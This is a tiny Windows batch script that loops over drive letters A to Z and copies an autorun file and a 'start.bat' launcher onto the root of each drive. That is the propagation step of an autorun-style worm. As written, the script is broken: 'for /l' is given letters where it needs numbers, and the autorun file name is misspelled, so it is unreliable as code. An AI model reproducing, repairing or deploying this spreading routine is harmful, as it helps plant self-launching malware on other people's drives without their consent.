@echo off

set list=A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z
for /l %%x in  (%list%) do (
	xcopy /s autorun.info %%x:\
	Xcopy /s start.bat %%x:\
	echo %%x
)

pause